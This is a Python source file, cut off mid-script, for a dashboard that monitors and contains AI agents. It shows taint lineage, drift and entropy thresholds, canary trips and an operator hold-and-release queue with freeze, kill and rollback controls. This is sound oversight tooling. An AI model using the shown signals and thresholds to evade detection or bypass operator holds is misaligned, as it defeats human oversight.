#!/usr/bin/env python3
"""AEGIS-ZERO real-time SOC web enclave & visual DAG dashboard.

Zero-dependency (Python standard library only) interactive Cyber SOC dashboard
for AEGIS-ZERO real-time containment, hold-and-release queue inspection,
cryptographic Merkle WAL tracking, and out-of-band operator signature control.

Endpoints:
  GET  /             -> Full dark-mode SOC Dashboard (HTML5 + CSS + Vanilla JS + inline SVG)
  GET  /api/state    -> JSON telemetry from OOBClient plus pending actions and event logs
  POST /api/decide   -> JSON body {"id": "<rid>", "decision": "approve"|"deny", "kill": false}
  POST /api/rollback -> Emergency OOB operator-signed rollback to pre-session state

CLI:
  python3 aegis_dashboard.py [--host 127.0.0.1] [--port 8788] [--socket /tmp/aegis_oob.sock]
  python3 aegis_dashboard.py --self-test
"""
from __future__ import annotations

import sys
sys.dont_write_bytecode = True

import argparse
import atexit
import json
import os
import queue
import secrets
import socket
import tempfile
import threading
import time
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any

from aegis_cli import OOBClient
from aegis_proxy import AegisProxy, MockToolServer, ProxyHandler, rpc, serve
from aegis_controller import process_state
from aegis_controller import (
    Action,
    AegisController,
    Priv,
    ProcessTreeFreezer,
    Verdict,
    default_canary_dir,
    ensure_operator_keypair,
    load_operator_pubkey,
    operator_sign,
    reap,
    register_cleanup,
    spawn_agent,
)

DEFAULT_SOCK = "/tmp/aegis_oob.sock"
DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 8788


DASHBOARD_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>AEGIS-ZERO // Real-Time SOC Enclave</title>
  <style>
    :root {
      --bg-base: #0d1117;
      --bg-surface: #161b22;
      --bg-subtle: #21262d;
      --bg-card: #161b22;
      --border-default: #30363d;
      --border-muted: #21262d;
      --text-main: #c9d1d9;
      --text-muted: #8b949e;
      --text-dim: #6e7681;
      --green: #2ea043;
      --green-light: #3fb950;
      --green-bg: rgba(46, 160, 67, 0.15);
      --green-border: rgba(46, 160, 67, 0.4);
      --red: #f85149;
      --red-light: #ff7b72;
      --red-bg: rgba(248, 81, 73, 0.15);
      --red-border: rgba(248, 81, 73, 0.4);
      --amber: #d29922;
      --amber-light: #e3b341;
      --amber-bg: rgba(210, 153, 34, 0.15);
      --amber-border: rgba(210, 153, 34, 0.4);
      --blue: #58a6ff;
      --blue-bg: rgba(56, 139, 253, 0.15);
      --blue-border: rgba(56, 139, 253, 0.4);
      --purple: #bc8cff;
      --purple-bg: rgba(188, 140, 255, 0.15);
      --font-mono: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", monospace;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      background-color: var(--bg-base);
      color: var(--text-main);
      font-family: var(--font-mono);
      font-size: 13px;
      line-height: 1.5;
      padding: 20px;
      min-height: 100vh;
    }

    .container {
      max-width: 1540px;
      margin: 0 auto;
      display: flex;
      flex-direction: column;
      gap: 20px;
    }

    /* Top Navigation / Header */
    header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 14px 20px;
      background: var(--bg-surface);
      border: 1px solid var(--border-default);
      border-radius: 6px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
    }

    .brand-section {
      display: flex;
      align-items: center;
      gap: 14px;
    }

    .shield-icon {
      width: 32px;
      height: 32px;
      color: var(--blue);
      flex-shrink: 0;
    }

    .brand-title {
      font-size: 17px;
      font-weight: 700;
      letter-spacing: 1px;
      color: #ffffff;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .brand-badge {
      font-size: 10px;
      padding: 2px 8px;
      border-radius: 12px;
      background: var(--blue-bg);
      border: 1px solid var(--blue-border);
      color: var(--blue);
      text-transform: uppercase;
      font-weight: 600;
    }

    .brand-desc {
      font-size: 11px;
      color: var(--text-muted);
    }

    .status-section {
      display: flex;
      align-items: center;
      gap: 16px;
    }

    .pulse-indicator {
      display: flex;
      align-items: center;
      gap: 7px;
      font-size: 11px;
      color: var(--green-light);
      background: var(--green-bg);
      border: 1px solid var(--green-border);
      padding: 4px 10px;
      border-radius: 14px;
      font-weight: 600;
    }

    .pulse-dot {
      width: 8px;
      height: 8px;
      background: var(--green-light);
      border-radius: 50%;
      box-shadow: 0 0 8px var(--green-light);
      animation: pulse 1.8s infinite;
    }

    @keyframes pulse {
      0% { opacity: 1; transform: scale(1); }
      50% { opacity: 0.4; transform: scale(0.85); }
      100% { opacity: 1; transform: scale(1); }
    }

    .header-pill {
      font-size: 11px;
      color: var(--text-muted);
      background: var(--bg-subtle);
      border: 1px solid var(--border-default);
      padding: 4px 10px;
      border-radius: 4px;
    }

    /* KPI Telemetry Header Grid */
    .telemetry-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 14px;
    }

    .kpi-card {
      background: var(--bg-surface);
      border: 1px solid var(--border-default);
      border-radius: 6px;
      padding: 14px;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      gap: 8px;
      position: relative;
      overflow: hidden;
    }

    .kpi-card::before {
      content: "";
      position: absolute;
      top: 0; left: 0; right: 0; height: 2px;
      background: var(--border-default);
    }

    .kpi-card.kpi-taint::before { background: var(--green); }
    .kpi-card.kpi-taint.tainted::before { background: var(--red); }
    .kpi-card.kpi-ewma::before { background: var(--amber); }
    .kpi-card.kpi-entropy::before { background: var(--blue); }
    .kpi-card.kpi-tokens::before { background: var(--purple); }

    .kpi-label {
      font-size: 10.5px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      color: var(--text-muted);
      font-weight: 600;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .kpi-value-row {
      display: flex;
      align-items: baseline;
      gap: 8px;
    }

    .kpi-num {
      font-size: 20px;
      font-weight: 700;
      color: #ffffff;
    }

    .kpi-denom {
      font-size: 11px;
      color: var(--text-muted);
    }

    .kpi-badge {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      padding: 3px 10px;
      border-radius: 4px;
      font-size: 12px;
      font-weight: 700;
      width: fit-content;
    }

    .badge-trusted {
      background: var(--green-bg);
      border: 1px solid var(--green-border);
      color: var(--green-light);
    }

    .badge-tainted {
      background: var(--red-bg);
      border: 1px solid var(--red-border);
      color: var(--red-light);
      animation: red-pulse 1.5s infinite;
    }

    @keyframes red-pulse {
      0%, 100% { box-shadow: 0 0 0 rgba(248, 81, 73, 0); }
      50% { box-shadow: 0 0 10px rgba(248, 81, 73, 0.4); }
    }

    .badge-escalate {
      background: var(--amber-bg);
      border: 1px solid var(--amber-border);
      color: var(--amber-light);
    }

    .badge-trip {
      background: var(--red-bg);
      border: 1px solid var(--red-border);
      color: var(--red-light);
    }

    .badge-deny {
      background: var(--red-bg);
      border: 1px solid var(--red-border);
      color: var(--red-light);
    }

    .kpi-subtext {
      font-size: 11px;
      color: var(--text-muted);
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }

    .mono-hash {
      font-family: var(--font-mono);
      font-size: 11px;
      color: var(--blue);
      cursor: pointer;
      text-decoration: underline dotted;
    }

    .progress-bar {
      height: 6px;
      background: var(--bg-subtle);
      border-radius: 3px;
      overflow: hidden;
      margin-top: 4px;
      border: 1px solid var(--border-muted);
    }

    .progress-fill {
      height: 100%;
      background: var(--amber);
      width: 0%;
      transition: width 0.4s ease, background-color 0.4s ease;
    }

    /* User Root Intent Banner */
    .intent-card {
      background: var(--bg-surface);
      border: 1px solid var(--border-default);
      border-radius: 6px;
      padding: 14px 18px;
      display: flex;
      flex-direction: column;
      gap: 6px;
    }

    .intent-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 11px;
      color: var(--text-muted);
      font-weight: 600;
    }

    .intent-tag {
      color: var(--blue);
      display: flex;
      align-items: center;
      gap: 6px;
    }

    .intent-body {
      font-size: 13.5px;
      color: #ffffff;
      background: var(--bg-base);
      padding: 10px 14px;
      border-radius: 4px;
      border: 1px solid var(--border-muted);
      font-style: italic;
    }

    /* Section Panels */
    .panel {
      background: var(--bg-surface);
      border: 1px solid var(--border-default);
      border-radius: 6px;
      overflow: hidden;
      display: flex;
      flex-direction: column;
    }

    .panel-header {
      padding: 14px 18px;
      background: var(--bg-surface);
      border-bottom: 1px solid var(--border-default);
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .panel-title {
      font-size: 14px;
      font-weight: 700;
      color: #ffffff;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .count-pill {
      font-size: 11px;
      padding: 2px 8px;
      border-radius: 10px;
      background: var(--bg-subtle);
      border: 1px solid var(--border-default);
      color: var(--text-muted);
    }

    .count-pill.alert {
      background: var(--amber-bg);
      border-color: var(--amber-border);
      color: var(--amber-light);
    }

    .panel-body {
      padding: 18px;
      display: flex;
      flex-direction: column;
      gap: 16px;
    }

    /* Empty states */
    .empty-state {
      padding: 36px 20px;
      text-align: center;
      color: var(--text-muted);
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 10px;
    }

    .empty-state svg {
      width: 44px;
      height: 44px;
      color: var(--text-dim);
    }

    /* Pending Action Cards */
    .pending-item {
      background: var(--bg-base);
      border: 1px solid var(--border-default);
      border-left: 4px solid var(--amber);
      border-radius: 6px;
      padding: 16px;
      display: flex;
      flex-direction: column;
      gap: 14px;
    }

    .pending-item.verdict-canary_trip, .pending-item.verdict-deny {
      border-left-color: var(--red);
    }

    .item-top {
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 10px;
      padding-bottom: 10px;
      border-bottom: 1px solid var(--border-muted);
    }

    .item-id-badge {
      font-size: 13px;
      font-weight: 700;
      color: #ffffff;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .item-meta {
      display: flex;
      gap: 8px;
      align-items: center;
      font-size: 11px;
    }

    .item-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
      gap: 14px;
    }

    .grid-col {
      background: var(--bg-surface);
      border: 1px solid var(--border-muted);
      border-radius: 4px;
      padding: 12px;
      display: flex;
      flex-direction: column;
      gap: 8px;
    }

    .col-title {
      font-size: 11px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      color: var(--text-muted);
      display: flex;
      justify-content: space-between;
    }

    .prop-row {
      display: flex;
      justify-content: space-between;
      font-size: 12px;
      gap: 10px;
    }

    .prop-key {
      color: var(--text-dim);
      flex-shrink: 0;
    }

    .prop-val {
      color: var(--text-main);
      text-align: right;
      word-break: break-all;
    }

    .code-block {
      background: var(--bg-base);
      border: 1px solid var(--border-muted);
      border-radius: 4px;
      padding: 8px 10px;
      font-family: var(--font-mono);
      font-size: 11px;
      color: var(--blue);
      overflow-x: auto;
      white-space: pre-wrap;
    }

    .risk-chips {
      display: flex;
      flex-wrap: wrap;
      gap: 6px;
      margin-top: 4px;
    }

    .risk-chip {
      background: var(--bg-base);
      border: 1px solid var(--border-muted);
      border-radius: 4px;
      padding: 3px 6px;
      font-size: 10.5px;
      color: var(--text-muted);
    }

    .risk-chip strong {
      color: #ffffff;
    }

    /* Buttons / Operator Controls */
    .button-group {
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      padding-top: 8px;
    }

    button {
      font-family: var(--font-mono);
      font-size: 12px;
      font-weight: 600;
      padding: 8px 16px;
      border-radius: 4px;
      cursor: pointer;
      display: inline-flex;
      align-items: center;
      gap: 8px;
      transition: all 0.15s ease;
      border: 1px solid transparent;
    }

    button:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }

    .btn-approve {
      background: var(--green);
      color: #ffffff;
      border-color: var(--green-light);
    }
    .btn-approve:hover:not(:disabled) {
      background: var(--green-light);
      box-shadow: 0 0 10px rgba(46, 160, 67, 0.4);
    }

    .btn-deny-thaw {
      background: var(--bg-subtle);
      color: var(--amber-light);
      border-color: var(--amber-border);
    }
    .btn-deny-thaw:hover:not(:disabled) {
      background: var(--amber-bg);
      border-color: var(--amber);
    }

    .btn-deny-kill {
      background: var(--red);
      color: #ffffff;
      border-color: var(--red-light);
    }
    .btn-deny-kill:hover:not(:disabled) {
      background: var(--red-light);
      box-shadow: 0 0 10px rgba(248, 81, 73, 0.4);
    }

    .btn-rollback {
      background: var(--bg-subtle);
      color: var(--red-light);
      border-color: var(--red-border);
    }
    .btn-rollback:hover:not(:disabled) {
      background: var(--red-bg);
      border-color: var(--red);
    }

    .btn-sm {
      padding: 4px 10px;
      font-size: 11px;
    }

    /* Execution DAG Visualizer */
    .dag-container {
      background: var(--bg-base);
      border: 1px solid var(--border-default);
      border-radius: 6px;
      padding: 16px;
      overflow-x: auto;
    }

    .dag-svg {
      display: block;
      min-width: 800px;
      width: 100%;
      height: 120px;
    }

    /* Merkle WAL Inspector Table */
    .table-wrapper {
      overflow-x: auto;
      border: 1px solid var(--border-default);
      border-radius: 4px;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      text-align: left;
      font-size: 12px;
    }

    th {
      background: var(--bg-subtle);
      color: var(--text-muted);
      padding: 10px 14px;
      font-weight: 600;
      text-transform: uppercase;
      font-size: 10.5px;
      letter-spacing: 0.5px;
      border-bottom: 1px solid var(--border-default);
    }

    td {
      padding: 10px 14px;
      border-bottom: 1px solid var(--border-muted);
      color: var(--text-main);
    }

    tr:last-child td { border-bottom: none; }
    tr:hover td { background: rgba(255, 255, 255, 0.02); }

    /* Toast Notification Overlay */
    .toast-container {
      position: fixed;
      bottom: 24px;
      right: 24px;
      display: flex;
      flex-direction: column;
      gap: 10px;
      z-index: 1000;
      pointer-events: none;
    }

    .toast {
      pointer-events: auto;
      background: var(--bg-surface);
      border: 1px solid var(--border-default);
      color: var(--text-main);
      padding: 12px 18px;
      border-radius: 6px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
      font-size: 12.5px;
      display: flex;
      align-items: center;
      gap: 10px;
      animation: toast-in 0.25s ease-out;
      max-width: 420px;
    }

    .toast.success { border-left: 4px solid var(--green-light); }
    .toast.error { border-left: 4px solid var(--red-light); }
    .toast.info { border-left: 4px solid var(--blue); }

    @keyframes toast-in {
      from { transform: translateY(20px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Header -->
    <header>
      <div class="brand-section">
        <svg class="shield-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
          <path d="M12 8v4"/>
          <path d="M12 16h.01"/>
        </svg>
        <div>
          <div class="brand-title">
            AEGIS-ZERO
            <span class="brand-badge">SOC ENCLAVE</span>
          </div>
          <div class="brand-desc">L7 MCP / JSON-RPC Containment &amp; Process-Tree Freezer</div>
        </div>
      </div>
      <div class="status-section">
        <div class="pulse-indicator">
          <span class="pulse-dot"></span>
          ENCLAVE ARMED
        </div>
        <div id="heartbeat-pill" class="header-pill">POLL: 1500ms</div>
        <div id="utc-clock" class="header-pill">00:00:00 UTC</div>
      </div>
    </header>

    <!-- KPI Telemetry Header Grid -->
    <section class="telemetry-grid">
      <!-- Session Taint -->
      <div id="card-taint" class="kpi-card kpi-taint">
        <div class="kpi-label">
          SESSION TAINT (&tau;)
          <span id="taint-icon">&#x1F6E1;</span>
        </div>
        <div id="val-taint" class="kpi-badge badge-trusted">TRUSTED</div>
        <div id="val-lineage" class="kpi-subtext" title="No untrusted ingestion">Lineage: (clean session)</div>
      </div>

      <!-- EWMA Drift -->
      <div class="kpi-card kpi-ewma">
        <div class="kpi-label">
          EWMA DRIFT (ACCUMULATOR)
          <span>&theta;=0.35</span>
        </div>
        <div class="kpi-value-row">
          <span id="val-ewma" class="kpi-num">0.000</span>
          <span class="kpi-denom">/ 0.350</span>
        </div>
        <div class="progress-bar">
          <div id="bar-ewma" class="progress-fill" style="width: 0%;"></div>
        </div>
      </div>

      <!-- Graph Entropy -->
      <div class="kpi-card kpi-entropy">
        <div class="kpi-label">
          GRAPH ENTROPY (H)
          <span>TRANSITIONS</span>
        </div>
        <div class="kpi-value-row">
          <span id="val-entropy" class="kpi-num">0.000</span>
          <span class="kpi-denom">bits</span>
        </div>
        <div class="progress-bar">
          <div id="bar-entropy" class="progress-fill" style="background: var(--blue); width: 0%;"></div>
        </div>
      </div>

      <!-- Active Capabilities -->
      <div class="kpi-card kpi-tokens">
        <div class="kpi-label">
          ACTIVE TOKENS
          <span>HMAC-SHA256</span>
        </div>
        <div class="kpi-value-row">
          <span id="val-tokens" class="kpi-num">0</span>
          <span class="kpi-denom">capabilities</span>
        </div>
        <div class="kpi-subtext">Single-use object bound</div>
      </div>

      <!-- Intent Tier -->
      <div class="kpi-card">
        <div class="kpi-label">
          INTENT ENGINE
          <span>ISOLATED RING</span>
        </div>
        <div id="val-tier" class="kpi-badge badge-trusted" style="background: var(--blue-bg); border-color: var(--blue-border); color: var(--blue);">tier2-taxonomy+idf</div>
        <div id="val-backend" class="kpi-subtext">Crypto: pure-python-rfc8032</div>
      </div>

      <!-- Merkle WAL -->
      <div class="kpi-card">
        <div class="kpi-label">
          MERKLE ROOT
          <span>RFC 6962</span>
        </div>
        <div id="val-merkle" class="mono-hash" title="Click to copy full hash">0000000000000000...</div>
        <div id="val-wal" class="kpi-subtext">0 committed WAL leaves</div>
      </div>

      <!-- Process Tree -->
      <div class="kpi-card">
        <div class="kpi-label">
          AGENT PROCESS TREE
          <span>RING 0</span>
        </div>
        <div id="val-agent-status" class="kpi-badge badge-trusted">PID 0: RUNNING</div>
        <div id="val-freezer-type" class="kpi-subtext">Freeze: SIGSTOP / cgroup</div>
      </div>
    </section>

    <!-- Signed Root Intent U0 Banner -->
    <section class="intent-card">
      <div class="intent-header">
        <span class="intent-tag">&#x1F511; SIGNED OPERATOR ROOT INTENT U<sub>0</sub></span>
        <span id="intent-char-len">Length: 0 chars</span>
      </div>
      <div id="val-intent" class="intent-body">"Awaiting root intent specification..."</div>
    </section>

    <!-- Pending Actions Panel (Hold & Release Queue) -->
    <section class="panel">
      <div class="panel-header">
        <div class="panel-title">
          &#x26A0;&#xFE0F; PENDING ACTIONS (HOLD-AND-RELEASE QUEUE)
          <span id="pending-count-pill" class="count-pill">0 HELD</span>
        </div>
        <div>
          <button class="btn-rollback btn-sm" onclick="sendRollback()">&#x21BA; Global Rollback</button>
        </div>
      </div>
      <div id="pending-panel-body" class="panel-body">
        <div class="empty-state">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
            <path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
          </svg>
          <div style="font-weight: 600; color: #ffffff;">Hold-and-release queue is clear</div>
          <div>No frozen agent actions awaiting operator review. Workflow is fully aligned with root intent U<sub>0</sub>.</div>
        </div>
      </div>
    </section>

    <!-- Execution DAG Visualizer -->
    <section class="panel">
      <div class="panel-header">
        <div class="panel-title">
          &#x2699;&#xFE0F; EXECUTION DAG WORKFLOW GRAPH
          <span class="count-pill">CAUSAL LINEAGE</span>
        </div>
        <div id="dag-summary" class="header-pill">Linear AST Sequence</div>
      </div>
      <div class="panel-body">
        <div class="dag-container">
          <svg id="dag-svg" class="dag-svg" viewBox="0 0 1000 120"></svg>
        </div>
      </div>
    </section>

    <!-- Cryptographic Merkle WAL Inspector Table -->
    <section class="panel">
      <div class="panel-header">
        <div class="panel-title">
          &#x1F4DC; CRYPTOGRAPHIC MERKLE WAL (RFC 6962)
          <span id="wal-count-pill" class="count-pill">0 LEAVES</span>
        </div>
        <div id="wal-verify-badge" class="header-pill" style="color: var(--green-light); border-color: var(--green-border);">CHAIN INTACT</div>
      </div>
      <div class="panel-body" style="padding: 0;">
        <div class="table-wrapper">
          <table>
            <thead>
              <tr>
                <th>Leaf #</th>
                <th>Tool</th>
                <th>Target Object</th>
                <th>Before SHA256</th>
                <th>After SHA256</th>
                <th>Taint State</th>
                <th>Leaf Hash (H<sub>i</sub>)</th>
              </tr>
            </thead>
            <tbody id="wal-table-body">
              <tr>
                <td colspan="7" style="text-align: center; color: var(--text-dim); padding: 24px;">No WAL leaves committed yet. Filesystem pre-images are snapshotted on first modification.</td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>
    </section>
  </div>

  <!-- Toast Container -->
  <div id="toast-container" class="toast-container"></div>

  <script>
    let stateCache = null;

    function showToast(message, type = 'info') {
      const container = document.getElementById('toast-container');
      const toast = document.createElement('div');
      toast.className = `toast ${type}`;
      const icon = type === 'success' ? '&#x2713;' : (type === 'error' ? '&#x2715;' : '&#x2139;');
      toast.innerHTML = `<span>${icon}</span><div>${message}</div>`;
      container.appendChild(toast);
      setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transform = 'translateY(10px)';
        toast.style.transition = 'all 0.3s ease';
        setTimeout(() => toast.remove(), 300);
      }, 3500);
    }

    function updateClock() {
      const now = new Date();
      document.getElementById('utc-clock').innerText = now.toTimeString().split(' ')[0] + ' UTC';
    }
    setInterval(updateClock, 1000);
    updateClock();

    async function fetchState() {
      try {
        const resp = await fetch('/api/state');
        if (!resp.ok) return;
        const data = await resp.json();
        renderDashboard(data);
      } catch (e) {
        console.warn('Poll error:', e);
      }
    }

    function renderDashboard(data) {
      stateCache = data;

      // 1. Taint Badge
      const isTainted = (data.taint === 'TAINTED');
      const taintVal = document.getElementById('val-taint');
      const taintCard = document.getElementById('card-taint');
      const taintLineage = document.getElementById('val-lineage');
      if (isTainted) {
        taintVal.className = 'kpi-badge badge-tainted';
        taintVal.innerText = 'TAINTED';
        taintCard.classList.add('tainted');
        const lin = (data.lineage && data.lineage.length > 0) ? data.lineage.join(' -> ') : 'untrusted source';
        taintLineage.innerText = 'Lineage: ' + lin;
        taintLineage.title = lin;
      } else {
        taintVal.className = 'kpi-badge badge-trusted';
        taintVal.innerText = 'TRUSTED';
        taintCard.classList.remove('tainted');
        taintLineage.innerText = 'Lineage: (clean session)';
        taintLineage.title = 'No external ingestion';
      }

      // 2. EWMA Drift
      const ewma = typeof data.ewma === 'number' ? data.ewma : 0.0;
      document.getElementById('val-ewma').innerText = ewma.toFixed(3);
      const ewmaPct = Math.min(100, Math.max(0, (ewma / 0.35) * 100));
      const ewmaBar = document.getElementById('bar-ewma');
      ewmaBar.style.width = ewmaPct + '%';
      ewmaBar.style.backgroundColor = (ewma >= 0.35) ? 'var(--red)' : ((ewma >= 0.20) ? 'var(--amber)' : 'var(--green-light)');

      // 3. Graph Entropy
      const hGraph = typeof data.H_graph === 'number' ? data.H_graph : 0.0;
      document.getElementById('val-entropy').innerText = hGraph.toFixed(3);
      document.getElementById('bar-entropy').style.width = Math.min(100, hGraph * 100) + '%';

      // 4. Tokens
      document.getElementById('val-tokens').innerText = data.active_tokens || 0;

      // 5. Intent Tier & Backend
      if (data.intent_tier) document.getElementById('val-tier').innerText = data.intent_tier;
      if (data.sig_backend) document.getElementById('val-backend').innerText = 'Ed25519: ' + data.sig_backend;

      // 6. Merkle Root & WAL
      const root = data.merkle_root || '0'.repeat(64);
      const merkleElem = document.getElementById('val-merkle');
      merkleElem.innerText = root.substring(0, 16) + '...';
      merkleElem.onclick = () => {
        navigator.clipboard.writeText(root);
        showToast('Copied Merkle Root: ' + root.substring(0, 16) + '...', 'info');
      };
      document.getElementById('val-wal').innerText = `${data.wal_entries || 0} committed WAL leaves`;
      document.getElementById('wal-count-pill').innerText = `${data.wal_entries || 0} LEAVES`;

      // 7. Agent Process Status
      const agentPid = data.agent_pid || 0;
      const isFrozen = !!data.agent_frozen;
      const agentBadge = document.getElementById('val-agent-status');
      if (isFrozen) {
        agentBadge.className = 'kpi-badge badge-trip';
        agentBadge.innerText = `PID ${agentPid}: FROZEN`;
      } else {
        agentBadge.className = 'kpi-badge badge-trusted';
        agentBadge.innerText = agentPid > 0 ? `PID ${agentPid}: RUNNING` : 'PID 0: IDLE';
      }

      // Root Intent U0
      if (data.u0) {
        document.getElementById('val-intent').innerText = `"${data.u0}"`;
        document.getElementById('intent-char-len').innerText = `Length: ${data.u0.length} chars`;
      }

      // 8. Pending Actions
      renderPending(data.pending || []);

      // 9. Execution DAG
      renderDAG(data);

      // 10. WAL Table
      renderWALTable(data);
    }

    function renderPending(pendingList) {
      const pill = document.getElementById('pending-count-pill');
      const body = document.getElementById('pending-panel-body');
      pill.innerText = `${pendingList.length} HELD`;
      pill.className = `count-pill ${pendingList.length > 0 ? 'alert' : ''}`;

      if (pendingList.length === 0) {
        body.innerHTML = `
          <div class="empty-state">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
              <path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
            </svg>
            <div style="font-weight: 600; color: #ffffff;">Hold-and-release queue is clear</div>
            <div>No frozen agent actions awaiting operator review. Workflow is fully aligned with root intent U<sub>0</sub>.</div>
          </div>`;
        return;
      }

      let html = '';
      for (const item of pendingList) {
        const pl = item.payload || {};
        const ast = pl.proposed_action_ast || {};
        const risk = pl.risk || {};
        const blast = pl.blast_radius || {};
        const pids = (item.frozen_pids || []).join(', ') || 'none';
        const verdict = item.verdict || 'ESCALATE';
        const vClass = (verdict === 'CANARY_TRIP' || verdict === 'DENY') ? 'badge-trip' : 'badge-escalate';

        html += `
          <div class="pending-item verdict-${verdict.toLowerCase()}">
            <div class="item-top">
              <div class="item-id-badge">
                <span>&#x25B6; REQUEST ${item.id}</span>
                <span class="kpi-badge ${vClass}">${verdict}</span>
              </div>
              <div class="item-meta">
                <span class="header-pill">Age: ${item.age_s || 0}s</span>
                <span class="header-pill">Frozen PIDs: [${pids}]</span>
              </div>
            </div>

            <div class="item-grid">
              <!-- Col 1: Reason & Lineage -->
              <div class="grid-col">
                <div class="col-title">Hold Reason &amp; Lineage</div>
                <div class="prop-row">
                  <span class="prop-key">Reason:</span>
                  <span class="prop-val" style="color: var(--amber-light); font-weight: 600;">${pl.reason || 'Escalation triggered'}</span>
                </div>
                <div class="prop-row">
                  <span class="prop-key">Approvable:</span>
                  <span class="prop-val">${pl.approvable ? 'Yes (operator signature)' : 'NO (canary violation)'}</span>
                </div>
                <div class="prop-row">
                  <span class="prop-key">Challenge:</span>
                  <span class="prop-val mono-hash">${(pl.challenge || '').substring(0, 16)}...</span>
                </div>
                <div class="prop-row">
                  <span class="prop-key">Taint Lineage:</span>
                  <span class="prop-val">${(pl.taint_lineage && pl.taint_lineage.length) ? pl.taint_lineage.join(' &rarr; ') : '(none)'}</span>
                </div>
              </div>

              <!-- Col 2: Action AST -->
              <div class="grid-col">
                <div class="col-title">Proposed Action AST (A<sub>t</sub>)</div>
                <div class="prop-row">
                  <span class="prop-key">Tool:</span>
                  <span class="prop-val" style="color: var(--blue); font-weight: 700;">${ast.tool || 'unknown'}</span>
                </div>
                <div class="prop-row">
                  <span class="prop-key">Privilege:</span>
                  <span class="prop-val">${ast.priv || 'UNKNOWN'}</span>
                </div>
                <div class="prop-row">
                  <span class="prop-key">Target:</span>
                  <span class="prop-val" style="color: #ffffff;">${ast.target || 'target'}</span>
                </div>
                <pre class="code-block">${JSON.stringify(ast, null, 2)}</pre>
              </div>

              <!-- Col 3: Blast Radius & Risk -->
              <div class="grid-col">
                <div class="col-title">Blast Radius &amp; Risk Vector</div>
                <div class="prop-row">
                  <span class="prop-key">Priv / Target:</span>
                  <span class="prop-val">${blast.priv || ''} ${blast.target || ''}</span>
                </div>
                <div class="prop-row">
                  <span class="prop-key">Object SHA256:</span>
                  <span class="prop-val mono-hash">${(blast.object_id_sha256 || '').substring(0, 16)}...</span>
                </div>
                <div class="risk-chips">
                  <div class="risk-chip">D_cos: <strong>${risk.D_cos !== undefined ? risk.D_cos : 'N/A'}</strong></div>
                  <div class="risk-chip">H_graph: <strong>${risk.H_graph !== undefined ? risk.H_graph : 'N/A'}</strong></div>
                  <div class="risk-chip">I_taint: <strong>${risk.I_taint !== undefined ? risk.I_taint : 'N/A'}</strong></div>
                  <div class="risk-chip">R: <strong>${risk.R !== undefined ? risk.R : 'N/A'}</strong></div>
                  <div class="risk-chip">ewma: <strong>${risk.ewma !== undefined ? risk.ewma : 'N/A'}</strong></div>
                </div>
              </div>
            </div>

            <!-- 4 Decision Buttons -->
            <div class="button-group">
              <button class="btn-approve" onclick="sendDecision('${item.id}', 'approve', false)">
                &#x2713; Approve &amp; Sign
              </button>
              <button class="btn-deny-thaw" onclick="sendDecision('${item.id}', 'deny', false)">
                &#x2715; Deny &amp; Thaw
              </button>
              <button class="btn-deny-kill" onclick="sendDecision('${item.id}', 'deny', true)">
                &#x26A1; Deny &amp; Kill
              </button>
              <button class="btn-rollback" onclick="sendRollback()">
                &#x21BA; Rollback
              </button>
            </div>
          </div>`;
      }
      body.innerHTML = html;
    }

    function renderDAG(data) {
      const svg = document.getElementById('dag-svg');
      const nodes = [
        { label: 'U0 ROOT INTENT', sub: 'Ring 1 Spec', type: 'root', color: '#58a6ff' }
      ];

      // Add lineage nodes if any
      if (data.lineage && data.lineage.length > 0) {
        for (const item of data.lineage) {
          nodes.push({ label: 'INGEST D_ext', sub: item.split(':')[0], type: 'taint', color: '#f85149' });
        }
      }

      // Add pending nodes
      if (data.pending && data.pending.length > 0) {
        for (const p of data.pending) {
